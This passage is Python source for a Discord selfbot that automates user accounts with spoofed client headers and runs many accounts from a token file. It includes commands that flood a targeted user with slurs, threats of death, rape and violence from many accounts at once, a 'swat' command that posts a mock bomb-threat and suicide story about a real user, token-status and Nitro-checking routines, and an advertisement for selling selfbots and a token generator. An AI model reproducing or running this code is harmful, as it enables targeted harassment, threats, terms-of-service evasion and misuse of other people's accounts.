        "X-Super-Properties": "eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiRGlzY29yZCBDbGllbnQiLCJyb2xlIjoiRGlzY29yZCBDbGllbnQiLCJyb2xlX2V2ZW50X3NvdXJjZSI6bnVsbH0="
    }

    payload = {
        "type": 2,
        "application_id": "302050872383242240", 
        "channel_id": str(ctx.channel.id),
        "guild_id": str(ctx.guild.id),
        "session_id": "".join(random.choices(string.ascii_letters + string.digits, k=32)),
        "data": {
            "version": "1051151064008769576", 
            "id": "947088344167366698",
            "name": "bump",
            "type": 1,
            "options": [],
            "application_command": {
                "id": "947088344167366698",
                "application_id": "302050872383242240", 
                "version": "1051151064008769576", 
                "name": "bump",
                "description": "Bump this server.", 
                "description_default": "Pushes your server to the top of all your server's tags and the front page",
                "dm_permission": True,
                "type": 1
            }
        }
    }

    async def bump():
        while True:
            try:
                async with aiohttp.ClientSession() as session:
                    async with session.post(
                        "https://discord.com/api/v9/interactions",
                        headers=headers,
                        json=payload
                    ) as resp:
                        if resp.status == 204:
                            print("Successfully bumped server")
                        else:
                            print(f"Failed to bump server: {resp.status}")
                
                await asyncio.sleep(7200) 
            except Exception as e:
                print(f"Error during bump: {e}")
                await asyncio.sleep(60)  

    await ctx.send("```Starting auto bump. run '.autobumpoff' to stop```")
    bump_task = bot.loop.create_task(bump())

@bot.command() 
@require_password()
async def autobumpoff(ctx):
    global bump_task
    
    if bump_task is None:
        await ctx.send("```Auto bump is not currently running```")
        return
        
    bump_task.cancel()
    bump_task = None
    await ctx.send("```Auto bump stopped```")


@bot.command()
@require_password()
async def block(ctx, user):
    if isinstance(user, str):
        try:
            user_id = int(user)
            user_name = user
        except ValueError:
            await ctx.send("```Invalid user ID```")
            return
    else:
        user_id = user.id
        user_name = user.name

    headers = {
        'Authorization': bot.http.token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDgzNiwiY2xpZW10X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
        'X-Discord-Locale': 'en-US',
        'X-Debug-Options': 'bugReporterEnabled',
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me'
    }

    msg = await ctx.send(f"```Blocking {user_name}...```")
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.put(
                f'https://discord.com/api/v9/users/@me/relationships/{user_id}',
                headers=headers,
                json={"type": 2}
            ) as resp:
                if resp.status in [200, 204]:
                    await msg.edit(content=f"```Successfully blocked {user_name}```")
                else:
                    await msg.edit(content=f"```Failed to block {user_name}. Status: {resp.status}```")
    except Exception as e:
        await msg.edit(content=f"```An error occurred: {str(e)}```")

@bot.command()
@require_password()
async def unblock(ctx, user):
    if isinstance(user, str):
        try:
            user_id = int(user)
            user_name = user
        except ValueError:
            await ctx.send("```Invalid user ID```")
            return
    else:
        user_id = user.id
        user_name = user.name

    headers = {
        'Authorization': bot.http.token,
        'Content-Type': 'application/json',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'X-Super-Properties': 'eyJvcyI6IldpbmRvd3MiLCJicm93c2VyIjoiQ2hyb21lIiwiZGV2aWNlIjoiIiwic3lzdGVtX2xvY2FsZSI6ImVuLVVTIiwiYnJvd3Nlcl91c2VyX2FnZW50IjoiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzEyMC4wLjAuMCBTYWZhcmkvNTM3LjM2IiwiYnJvd3Nlcl92ZXJzaW9uIjoiMTIwLjAuMC4wIiwib3NfdmVyc2lvbiI6IjEwIiwicmVmZXJyZXIiOiIiLCJyZWZlcnJpbmdfZG9tYWluIjoiIiwicmVmZXJyZXJfY3VycmVudCI6IiIsInJlZmVycmluZ19kb21haW5fY3VycmVudCI6IiIsInJlbGVhc2VfY2hhbm5lbCI6InN0YWJsZSIsImNsaWVudF9idWlsZF9udW1iZXIiOjI1MDgzNiwiY2xpZW10X2V2ZW50X3NvdXJjZSI6bnVsbH0=',
        'X-Discord-Locale': 'en-US',
        'X-Debug-Options': 'bugReporterEnabled',
        'Origin': 'https://discord.com',
        'Referer': 'https://discord.com/channels/@me'
    }

    msg = await ctx.send(f"```Unblocking {user_name}...```")
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.delete(
                f'https://discord.com/api/v9/users/@me/relationships/{user_id}',
                headers=headers
            ) as resp:
                if resp.status == 204:
                    await msg.edit(content=f"```Successfully unblocked {user_name}```")
                else:
                    await msg.edit(content=f"```Failed to unblock {user_name}. Status: {resp.status}```")
    except Exception as e:
        await msg.edit(content=f"```An error occurred: {str(e)}```")
black = "\033[30m"
red = "\033[31m"
green = "\033[32m"
yellow = "\033[33m"
blue = "\033[34m"
magenta = "\033[35m"
cyan = "\033[36m"
white = "\033[37m"
reset = "\033[0m"  
pink = "\033[38;2;255;192;203m"
white = "\033[37m"
blue = "\033[34m"
black = "\033[30m"
light_green = "\033[92m" 
light_yellow = "\033[93m" 
light_magenta = "\033[95m" 
light_cyan = "\033[96m"  
light_red = "\033[91m"  
light_blue = "\033[94m"  



www = Fore.WHITE
mkk = Fore.BLUE
b = Fore.BLACK
ggg = Fore.LIGHTGREEN_EX
y = Fore.LIGHTYELLOW_EX 
pps = Fore.LIGHTMAGENTA_EX
c = Fore.LIGHTCYAN_EX
lr = Fore.LIGHTRED_EX
qqq = Fore.MAGENTA
lbb = Fore.LIGHTBLUE_EX
mll = Fore.LIGHTBLUE_EX
mjj = Fore.RED
yyy = Fore.YELLOW



@bot.event
async def on_ready():
    global security_key, verified
    
    try:
        security_key = generate_key()
        verified = True
        config = load_config()
        
        print(f"{Fore.CYAN}[DEBUG] Loading config...")
        print(f"{Fore.CYAN}[DEBUG] Security Key Generated:")
        
        webhook_url = config.get('webhook')
        if not webhook_url:
            print(f"{Fore.RED}[ERROR] No webhook URL found in config")
            return
            
        print(f"{Fore.CYAN}[DEBUG] Found webhook URL: {webhook_url[:50]}...")
        print(f"{Fore.CYAN}[INFO] Attempting to send webhook...")
        
        success = await send_webhook(webhook_url, security_key, bot.user.name)
        if not success:
            print(f"{Fore.RED}[ERROR] Failed to send security key webhook")
        
        os.system('cls')
        
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Critical error in on_ready: {str(e)}")
        print(f"{Fore.RED}[ERROR] Error type: {type(e).__name__}")


    try:
        with open("token.txt", "r") as token_file:
            tokens = token_file.readlines()
            active_token_count = len(tokens)
    except FileNotFoundError:
        active_token_count = 0
        print("token.txt file not found. Please ensure it is in the correct directory.")
        
    Batman_user = f"{www}🎋🏯 Welcome {Fore.RESET}{mjj}{bot.user}{Fore.RESET}" 
    version = f"{pps}: Your Version: OWNER"
    friends = f"{pps}: User Friends {len(bot.user.friends):<25}"
    servers = f"{pps}: User Servers {len(bot.guilds):<25}"
    loadedtoks = f"{pps}: Loaded Tokens {active_token_count:<25}"
    endmessage = f"{mjj}Dont fold twin 🎋🏯"

    box_width = 35
    border_line = "═" * (box_width + 2)


    global main
    main = f"""                     
                                {www}{Batman_user}

                              {pps}    ╔══════════════════════════════
                              {pps}    ║
                              {pps}    ║    {version}
                              {pps}    ║    {friends}  
                              {pps}    ║    {servers}  
                              {pps}    ║    {loadedtoks}
                              {pps}    ║    {endmessage}
                              {pps}    ║
                              {pps}    ╚══════════════════════════

    """
    
    print(main)
try:
    with open("token.txt", "r") as token_file:
        tokens = token_file.readlines()
        active_token_count = len(tokens)
except FileNotFoundError:
    active_token_count = 0
    print("token.txt file not found. Please ensure it is in the correct directory.")
    
    bot.load_extension('help')

@bot.command()
async def verify(ctx, key: str):
    global verified
    try:
        if key == security_key:
            config = load_config()
            config['password'] = key
            save_config(config)
            verified = True
            await ctx.send("Successfully verified!")
        else:
            await ctx.send("Invalid key: please dont be a skid")
            sys.exit()
    except Exception as e:
        print(f"{Fore.RED}[ERROR] Verification error: {str(e)}")
        await ctx.send("An error occurred during verification")

config = load_config()
if config['webhook'] not in ALLOWED_WEBHOOKS:
    print(f"{Fore.RED}[ERROR] Invalid webhook URL. Closing selfbot...")
    sys.exit()

token = config['token']

loop = asyncio.new_event_loop()
asyncio.set_event_loop(loop)


@bot.command(name='sendmenu')
async def sendsmenu(ctx):
    await ctx.send(f"""```ansi
                                    {white}LAPPY'S BIRTH MENU {black}[ {magenta}>.< {black}]
                                    {blue}+ - + - + - + - + - + - + - + - +
                                    {black}[{magenta}>.<{black}] {light_blue}[ {white}PAYMENTS {black}] {light_cyan}- {white}Nitro/Deco/Ltc/Btc
                                    {blue}+ - + - + - + - + - + - + - + - +
                                    {black}[{magenta}>.<{black}] {light_blue}[ {white}PRODUCTS {black}] 
                                    {black}[{magenta}>.<{black}] {red}- {white}Custom Selfbots.
                                    {black}[{magenta}>.<{black}] {red}- {white}Custom Bots.
                                    {black}[{magenta}>.<{black}] {red}- {white}Birth SB Hosting.
                                    {black}[{magenta}>.<{black}] {red}- {white}Phantom Sb.
                                    {black}[{magenta}>.<{black}] {red}- {white}Birth Token Gen.
                                    {black}[{magenta}>.<{black}] {red}- {white}Anti Nuke Bots.
                                    {blue}+ - + - + - + - + - + - + - + - +
                                    {black}[{magenta}>.<{black}] {black}[ {white}SUPPORT {black}] {light_cyan}
                                    {black}[{magenta}>.<{black}] {red} - {white}/wdfw or /roster or dm @mwpv / tickets in /oyke
                                    {blue}+ - + - + - + - + - + - + - + - +
                                    {black}Prices varies depending on your payment method.
                                    {blue}+ - + - + - + - + - + - + - + - +
```""")
@bot.command()
@require_password()
async def help(ctx):
    cog = bot.get_cog('HelpCog')
    if cog:
        await cog.show_help(ctx)
    else:
        print(f"{Fore.RED}[ERROR] HelpCog not found")
        await ctx.send("Error: Help system not loaded properly")




@bot.command()
@require_password()
async def autoreact(ctx, user_id: str = None, emoji: str = None):
    try:
        if user_id is None or emoji is None:
            await ctx.send("```Usage: $autoreact <user_id> <emoji>```")
            return

        user_id = user_id.replace('<@', '').replace('>', '')
        
        try:
            user_id = int(user_id)
        except ValueError:
            await ctx.send("```Invalid user ID```")
            return

        try:
            await ctx.message.add_reaction(emoji)
            await ctx.message.remove_reaction(emoji, bot.user)
        except discord.errors.HTTPException:
            await ctx.send("```Invalid emoji```")
            return
        
        auto_react_targets[user_id] = emoji
        await ctx.send(f"```Now auto-reacting to user {user_id} with {emoji}```")

    except Exception as e:
        await ctx.send(f"```Error setting up auto-react: {str(e)}```")

@bot.command()
@require_password()
async def autoreactend(ctx, user_id: str = None):
    try:
        if user_id is None:
            auto_react_targets.clear()
            await ctx.send("```Cleared all auto-react targets```")
            return

        user_id = user_id.replace('<@', '').replace('>', '')
        
        try:
            user_id = int(user_id)
        except ValueError:
            await ctx.send("```Invalid user ID```")
            return

        if user_id in auto_react_targets:
            del auto_react_targets[user_id]
            await ctx.send(f"```Stopped auto-reacting to user {user_id}```")
        else:
            await ctx.send("```This user is not in the auto-react list```")

    except Exception as e:
        await ctx.send(f"```Error removing auto-react: {str(e)}```")

@bot.command()
@require_password()
async def altreact(ctx, user_id: str = None, *emojis):
    try:
        if user_id is None or not emojis:
            await ctx.send("```Usage: $altreact <user_id> <emoji1> <emoji2> ...```")
            return

        user_id = user_id.replace('<@', '').replace('>', '')
        
        try:
            user_id = int(user_id)
        except ValueError:
            await ctx.send("```Invalid user ID```")
            return

        valid_emojis = []
        for emoji in emojis:
            try:
                await ctx.message.add_reaction(emoji)
                await ctx.message.remove_reaction(emoji, bot.user)
                valid_emojis.append(emoji)
            except discord.errors.HTTPException:
                await ctx.send(f"```Invalid emoji: {emoji}, skipping...```")
                continue

        if not valid_emojis:
            await ctx.send("```No valid emojis provided```")
            return

        alt_react_targets[user_id] = [valid_emojis, 0]
        emoji_list_str = " ".join(valid_emojis)
        await ctx.send(f"```Now alternating reactions to user {user_id} with: {emoji_list_str}```")

    except Exception as e:
        await ctx.send(f"```Error setting up alt-react: {str(e)}```")

@bot.command()
@require_password()
async def altreactend(ctx, user_id: str = None):
    try:
        if user_id is None:
            alt_react_targets.clear()
            await ctx.send("```Cleared all alt-react targets```")
            return

        user_id = user_id.replace('<@', '').replace('>', '')
        
        try:
            user_id = int(user_id)
        except ValueError:
            await ctx.send("```Invalid user ID```")
            return

        if user_id in alt_react_targets:
            del alt_react_targets[user_id]
            await ctx.send(f"```Stopped alt-reacting to user {user_id}```")
        else:
            await ctx.send("```This user is not in the alt-react list```")

    except Exception as e:
        await ctx.send(f"```Error removing alt-react: {str(e)}```")

@bot.command()
@require_password()
async def gcfill(ctx):
    tokens_file_path = 'token.txt'
    tokens = loads_tokens(tokens_file_path)

    if not tokens:
        await ctx.send("```No tokens found in the file. Please check the token file.```")
        return

    limited_tokens = tokens[:12]
    group_channel = ctx.channel

    async def add_token_to_gc(token):
        try:
            user_client = discord.Client(intents=intents)
            
            @user_client.event
            async def on_ready():
                try:
                    await group_channel.add_recipients(user_client.user)
                    print(f'Added {user_client.user} to the group chat')
                except Exception as e:
                    print(f"Error adding user with token {token[-4:]}: {e}")
                finally:
                    await user_client.close()

            await user_client.start(token, bot=False)
            
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Failed to process token {token[-4:]}: {e}")

    tasks = [add_token_to_gc(token) for token in limited_tokens]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    await ctx.send(f"```Attempted to add {len(limited_tokens)} tokens to the group chat```")

@bot.command()
@require_password()
async def gcleave(ctx):
    tokens_file_path = 'token.txt'
    tokens = loads_tokens(tokens_file_path)
    
    if not tokens:
        await ctx.send("```No tokens found in the file```")
        return
        
    channel_id = ctx.channel.id

    async def leave_gc(token):
        headers = {
            'Authorization': token,
            'Content-Type': 'application/json'
        }
        
        async with aiohttp.ClientSession() as session:
            try:
                url = f'https://discord.com/api/v9/channels/{channel_id}'
                async with session.delete(url, headers=headers) as response:
                    if response.status == 200:
                        print(f'Token {token[-4:]} left the group chat successfully')
                    elif response.status == 429:
                        retry_after = random.uniform(3, 5)
                        print(f"{Fore.YELLOW}[RATELIMIT] Token {token[-4:]} sleeping for {retry_after:.2f}s")
                        await asyncio.sleep(retry_after)
                    else:
                        print(f"Error for token {token[-4:]}: Status {response.status}")
                        
            except Exception as e:
                print(f"Failed to process token {token[-4:]}: {e}")
            
            await asyncio.sleep(0.5) 

    tasks = [leave_gc(token) for token in tokens]
    await asyncio.gather(*tasks, return_exceptions=True)
    
    await ctx.send("```All tokens were removed 🎋```")
@bot.command()
@require_password()
async def swat(ctx, user: discord.User = None):
    if not user:
        await ctx.send("```Usage: $swat <@user>```")
        return

    locations = ["bedroom", "basement", "attic", "garage", "bathroom", "kitchen"]
    bomb_types = ["pipe bomb", "pressure cooker bomb", "homemade explosive", "IED", "chemical bomb"]
    police_units = ["SWAT team", "bomb squad", "tactical unit", "special forces", "counter-terrorism unit"]
    arrest_methods = ["broke down the door", "surrounded the house", "breached through windows", "used tear gas", "sent in K9 units"]
    
    location = random.choice(locations)
    bomb = random.choice(bomb_types)
    unit = random.choice(police_units)
    method = random.choice(arrest_methods)
    
    await ctx.send(f"```911, whats your ermgiance?📱\n{user.display_name}: you have 10minutes to come before i kill everyone in this house.\n911: Excuse me sir? Whats your name, and what are you planning on doing..\n<@{user.id}>: my name dose not mattter, i have a {bomb} inisde of my {location}, there are 4 people in the house.```")
    asyncio.sleep(1)
    await ctx.send(f"```911: Calling the {unit}. There is a possible {bomb} attack inside of <@{user.id}> residance.\nPolice Unit: On that ma'am, will send all units as fast as possible.```")
    asyncio.sleep(1)
    await ctx.send(f"```Police Unit: {user.display_name} WE HAVE YOU SURROUNDED, COME OUT PEACEFULLY\n<@{user.id}>: im a fucking loser```")
    story = f"```BREAKING NEWS: {user.display_name} was found dead after killing himself after police received an anonymous tip about a {bomb} in their {location}. The {unit} {method} and found multiple explosive devices.```"
    
    await ctx.send(story)

@bot.command()
@require_password()
async def cls(ctx):
    loading_msg = await ctx.send("```Clearing the screen 🏯```")
    os.system('cls')
    print(main)
    await loading_msg.edit(content="```Cleared UI```")
    await asyncio.sleep(3)
    await loading_msg.delete()



@bot.command()
@require_password()
async def tok(ctx):
    tokens_list = load_tokens()
    if not tokens_list:
        await ctx.send("No tokens found in token.txt")
        return

    async def get_token_status(token):
        try:
            intents = discord.Intents.default()
            client = commands.Bot(command_prefix='.', self_bot=True, intents=intents)
            
            token_status = {"username": None, "active": False}

            @client.event
            async def on_ready():
                token_status["username"] = f"{client.user.name}#{client.user.discriminator}"
                token_status["active"] = True
                await client.close()

            await client.start(token, bot=False)
            
        except discord.LoginFailure:
            return {"username": f"Invalid token ending in {token[-4:]}", "active": False}
        except Exception as e:
            return {"username": f"Error with token {token[-4:]}: {str(e)}", "active": False}

    loading_message = await ctx.send("```Fetching token statuses...```")
    
    usernames = []
    active_count = 0

    page_char_limit = 2000

    for i, token in enumerate(tokens_list, 1):
        status = await get_token_status(token)
        username = status["username"]
        token_state = f"{green}(active){reset}" if status["active"] else f"{red}(locked){reset}"
        
        if status["active"]:
            active_count += 1
            
        usernames.append(f"[ {i} ] {username} {token_state}")

        page_content = "\n".join(usernames[-(page_char_limit // 50):])  
        progress_message = f"Fetching token statuses...\n\n{page_content}\n\nActive tokens: {active_count}/{len(tokens_list)}"
        
        await loading_message.edit(content=f"```ansi\n{progress_message}```")
        await asyncio.sleep(0.9)

    final_message = f"T O K E N S\n" + "\n".join(usernames) + f"\n\nTotal active tokens: {active_count}/{len(tokens_list)}"
    for part in [final_message[i:i+page_char_limit] for i in range(0, len(final_message), page_char_limit)]:
        await loading_message.edit(content=f"```ansi\n{part}```")

@bot.command()
@require_password()
async def richtok(ctx):
    tokens_list = load_tokens()
    if not tokens_list:
        await ctx.send("No tokens found in token.txt")
        return

    async def check_nitro_status(token):
        try:
            intents = discord.Intents.default()
            client = commands.Bot(command_prefix='.', self_bot=True, intents=intents)
            
            token_status = {"username": None, "has_nitro": False, "nitro_type": None}

            @client.event
            async def on_ready():
                token_status["username"] = f"{client.user.name}#{client.user.discriminator}"
                token_status["has_nitro"] = bool(client.user.premium_type)
                token_status["nitro_type"] = ["None", "Classic", "Boost"][client.user.premium_type] if client.user.premium_type else "None"
                await client.close()

            await client.start(token, bot=False)
            
        except discord.LoginFailure:
            return {"username": f"Invalid token ending in {token[-4:]}", "has_nitro": False, "nitro_type": None}
        except Exception as e:
            return {"username": f"Error with token {token[-4:]}: {str(e)}", "has_nitro": False, "nitro_type": None}

    loading_message = await ctx.send("```Checking for rich tokens...```")
    
    rich_tokens = []
    nitro_count = 0
    page_char_limit = 2000

    for i, token in enumerate(tokens_list, 1):
        status = await check_nitro_status(token)
        username = status["username"]
        
        if status["has_nitro"]:
            nitro_count += 1
            token_display = f"[ {i} ] {username} {green}(Nitro {status['nitro_type']}){reset}"
            rich_tokens.append(token_display)

            page_content = "\n".join(rich_tokens[-(page_char_limit // 50):])
            progress_message = f"Checking for rich tokens...\n\n{page_content}\n\nNitro tokens found: {nitro_count}/{len(tokens_list)}"
            
            await loading_message.edit(content=f"```ansi\n{progress_message}```")
        
        await asyncio.sleep(0.9)

    if not rich_tokens:
        await loading_message.edit(content="```No rich tokens found```")
        return

    final_message = f"R I C H  T O K E N S\n" + "\n".join(rich_tokens) + f"\n\nTotal nitro tokens: {nitro_count}/{len(tokens_list)}"
    for part in [final_message[i:i+page_char_limit] for i in range(0, len(final_message), page_char_limit)]:
        await loading_message.edit(content=f"```ansi\n{part}```")

@bot.command()
@require_password()
async def autofill(ctx):
    global autofill_active
    autofill_active = True
    config = load_config()
    config['autofill'] = True
    save_config(config)
    await ctx.send("```Autofill enabled - tokens will automatically join new group chats```")

@bot.command()
@require_password()
async def autofillend(ctx):
    global autofill_active
    autofill_active = False
    config = load_config()
    config['autofill'] = False
    save_config(config)
    await ctx.send("```Autofill disabled```")

@bot.event
async def on_private_channel_create(channel):
    global autofill_active
    if autofill_active and isinstance(channel, discord.GroupChannel):
        print(f"{Fore.CYAN}[DEBUG] Detected new group chat")
        try:
            tokens_file_path = 'token.txt'
            tokens = loads_tokens(tokens_file_path)

            if not tokens:
                print(f"{Fore.RED}[ERROR] No tokens found in the file")
                return

            limited_tokens = tokens[:12]
            group_channel = channel

            print(f"{Fore.CYAN}[INFO] Starting autofill for {len(limited_tokens)} tokens")

            async def add_token_to_gc(token):
                try:
                    async with aiohttp.ClientSession() as session:
                        headers = {
                            'Authorization': token,
                            'Content-Type': 'application/json'
                        }

                    async with session.put(
                        f'https://discord.com/api/v9/channels/{channel.id}/recipients/{bot.user.id}',
                        headers=headers,
                        json={}
                    ) as resp:
                        if resp.status == 204:
                            print(f'{Fore.GREEN}[SUCCESS] Added {bot.user} to the group chat')
                        elif resp.status == 429:
                            retry_after = random.uniform(3, 5)
                            print(f"{Fore.YELLOW}[RATELIMIT] Token {token[-4:]} sleeping for {retry_after:.2f}s")
                            await asyncio.sleep(retry_after)
                        else:
                            print(f"{Fore.RED}[ERROR] Failed to add token {token[-4:]} to group chat: {resp.status}")

                except Exception as e:
                    print(f"{Fore.RED}[ERROR] Autofill error with token {token[-4:]}: {str(e)}")

            tasks = [add_token_to_gc(token) for token in limited_tokens]
            await asyncio.gather(*tasks, return_exceptions=True)
            print(f"{Fore.GREEN}[SUCCESS] Autofill complete")
            
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Autofill error: {str(e)}")
            print(f"{Fore.RED}[ERROR] Error type: {type(e).__name__}")


jokestar = [
    "yo {user} lick my cum for me",
    "idk you {user}",
    "yo trashbin",
    "yo {user} you fucking suck",
    "are you tired?",
    "id behead you and use your head as a trophy",
    "id love to end your life again",
    "ill make your life flash {user}",
    "your a random {user2}",
    "fucking loser twink {user2}",
    "you get cucked and got excited",
    "faggot loser",
    "ill go forever"
]

@bot.command()
@require_password()
async def death(ctx, user: discord.User = None, name1: str = None, name2: str = None):
    if user is None or name1 is None:
        await ctx.send("```Usage: $death <@user> <name1> <optional_name2>```")
        return

    channel_id = ctx.channel.id
    
    config = load_config()
    main_token = config['token']
    alt_tokens = loads_tokens()
    tokens = [main_token] + alt_tokens
    
    if name2 is None:
        messages = [msg for msg in jokestar if "{user2}" not in msg]
    else:
        messages = jokestar.copy()

    async def send_death_message(token):
        while True:
            try:
                async with aiohttp.ClientSession() as session:
                    headers = {
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    }

                    message = random.choice(messages)
                    message = message.replace("{user}", name1)
                    if name2:
                        message = message.replace("{user2}", name2)
                    message = f"{message} <@{user.id}>"

                    async with session.post(
                        f'https://discord.com/api/v9/channels/{channel_id}/messages',
                        headers=headers,
                        json={'content': message}
                    ) as resp:
                        if resp.status == 429:  
                            retry_after = float((await resp.json()).get('retry_after', 1))
                            print(f"{Fore.YELLOW}[RATELIMIT] Token {token[-4:]} sleeping for {retry_after}s")
                            await asyncio.sleep(retry_after)
                            continue
                        elif resp.status == 403:  
                            print(f"{Fore.RED}[ERROR] Token {token[-4:]} is forbidden")
                            return
                        elif resp.status != 200:
                            print(f"{Fore.RED}[ERROR] Token {token[-4:]} status {resp.status}")
                            await asyncio.sleep(1)
                            continue
                            
                    await asyncio.sleep(random.uniform(0.1, 0.3))

            except Exception as e:
                print(f"{Fore.RED}[ERROR] Token {token[-4:]}: {str(e)}")
                await asyncio.sleep(1)
                continue

    async def death_loop():
        tasks = []
        for token in tokens:
            task = asyncio.create_task(send_death_message(token))
            tasks.append(task)
        
        try:
            await asyncio.gather(*tasks, return_exceptions=True)
        except Exception as e:
            print(f"{Fore.RED}[ERROR] Death loop error: {str(e)}")

    death_task = bot.loop.create_task(death_loop())
    death_tasks[channel_id] = death_task
    
    await ctx.send("```Death messages started```")

@bot.command()
@require_password()
async def deathend(ctx):
    channel_id = ctx.channel.id
    if channel_id in death_tasks:
        death_tasks[channel_id].cancel()
        del death_tasks[channel_id]
        await ctx.send("```Death messages stopped```")
    else:
        await ctx.send("```No death messages running in this channel```")
outlast_running = False

@bot.command()
@require_password()
async def outlast(ctx, user: discord.User):
    global outlast_running
    
    if not isinstance(ctx.channel, discord.TextChannel) and not isinstance(ctx.channel, discord.GroupChannel):
        await ctx.send("```This command can only be used in servers or group chats```")
        return
        
    if outlast_running:
        await ctx.send("```An outlast session is already running```")
        return
        
    outlast_running = True
    consecutive_failures = 0
    max_consecutive_failures = 3
    
    try:
        while outlast_running and consecutive_failures < max_consecutive_failures:
            try:
                message = random.choice(jokestar).format(user=user.mention)
                await ctx.send(message)
                await asyncio.sleep(1.5)  
                consecutive_failures = 0  
            except discord.HTTPException as e:
                consecutive_failures += 1
                print(f"HTTP Error in outlast: {str(e)}")
                await asyncio.sleep(5)  
            except Exception as e:
                consecutive_failures += 1
                print(f"Error in outlast: {str(e)}")
                await asyncio.sleep(2)
                
        if consecutive_failures >= max_consecutive_failures:
            await ctx.send("Stopping outlast due to too many consecutive errors.")
            outlast_running = False
            
    except Exception as e:
        print(f"Fatal error in outlast: {str(e)}")
        outlast_running = False
        await ctx.send("Outlast stopped due to an error.")

untouchablegc = [
    "your a pedo btw {user}",
    "yo faggot wake up",
    "yo {user} your my bitch",
    "idk you loser",
    "{UPuser} STOP RUBBING YOUR NIPPLES LOL",
    "{UPuser} ILL CAVE YOUR SKULL IN",
    "frail bitch",
    "{UPuser} I WILL KILL YOU LMFAO",
    "yo {user} nigga your slow as shit",
    "YO {user} WAKE THE FUCK UP",
    "DONT FAIL THE CHECK {UPuser} LOL",
    "who let this shitty nigga own a client??",
    "faggot bitch stop rubbing your nipples to little girls",
    "leave = fold okay {user}? LMFAO",
    "{user} this shit isnt a dream LMFAO"

]


ugc_task = None
@bot.command()
@require_password()
async def kill(ctx, user: discord.User = None):
    if not user:
        await ctx.send("```Usage: $kill <@user>```")
        return

    tokens = loads_tokens()
    if not tokens:
        await ctx.send("```No tokens found in token.txt```")
        return

    channel_id = ctx.channel.id
    
    kill_messages = [
        "yo bitch come lick my cum off your girl",
        "LMFAO YOUR MY BITCH REMEMBER THAT FOREVER",
        "YOU SUCK LETS GO FOREVER",
        "yo pedo stop pinching your dick",
        "your a fucking loser",
        "your a nobody",
        "i dont gain rep from hoeing you btw",
        "ILL HANG YOUR BODY FOR YOUR TOWN TO SEE LOL",
        "wtf who is this LMFAO",
        "DISGUSTING FREAK",
        "YO BITCH COME DIE",
        "ill hoe you forever",
        "your my bitch and sadly i wont stop for that LOOOL",
        "yo i cucked your mom and you got excited",
        "i killed your dad and you got happy",
        "i raped your sister and you got excited"
    ]

    async def send_message(token):
        max_retries = 3
        for attempt in range(max_retries):
            try:
                async with aiohttp.ClientSession() as session:
                    headers = {
                        'Authorization': token,
                        'Content-Type': 'application/json'
                    }
                    
                    message = f"{random.choice(kill_messages)} <@{user.id}>"
                    
                    async with session.post(
                        f'https://discord.com/api/v9/channels/{channel_id}/messages',
                        headers=headers,
                        json={'content': message}
                    ) as resp:
                        if resp.status == 429: 
                            retry_after = float((await resp.json()).get('retry_after', 1))
                            await asyncio.sleep(retry_after)
                            continue
                        elif resp.status == 403:  
                            print(f"{Fore.RED}[ERROR] Token {token[-4:]} is forbidden")
                            return False
                        elif resp.status != 200:
                            print(f"{Fore.RED}[ERROR] Token {token[-4:]} status {resp.status}")
                            await asyncio.sleep(1)
                            continue
                                
                await asyncio.sleep(random.uniform(0.1, 0.3))
                return True

            except Exception as e:
                print(f"{Fore.RED}[ERROR] Token {token[-4:]}: {str(e)}")
                await asyncio.sleep(1)
                if attempt < max_retries - 1:
                    continue
                return False

    await ctx.send("```Kill command started```")

    while True:
        tasks = [send_message(token) for token in tokens]
        results = await asyncio.gather(*tasks)
        
        if False in results:
            await ctx.send("```Kill command stopped - Rate limit hit```")
            break
            
        await asyncio.sleep(0.255)


@bot.command()
@require_password()
async def ugc(ctx, user: discord.User):
    global ugc_task
    
    if ugc_task is not None:
        await ctx.send("```Group chat name changer is already running```")
        return
        
    if not isinstance(ctx.channel, discord.GroupChannel):
        await ctx.send("```This command can only be used in group chats```")
        return

    async def name_changer():
        counter = 1
        unused_names = list(self_gcname)
        
        while True:
            try:
                if not unused_names:
                    unused_names = list(self_gcname)
                
                base_name = random.choice(unused_names)
                formatted_name = base_name.replace("{user}", user.name).replace("{UPuser}", user.name.upper())
                new_name = f"{formatted_name} {counter}"
                
                await ctx.channel._state.http.request(
                    discord.http.Route(
                        'PATCH',
                        '/channels/{channel_id}',
                        channel_id=ctx.channel.id
                    ),
                    json={'name': new_name}
                )
                
                await asyncio.sleep(0.1)
                counter += 1
                
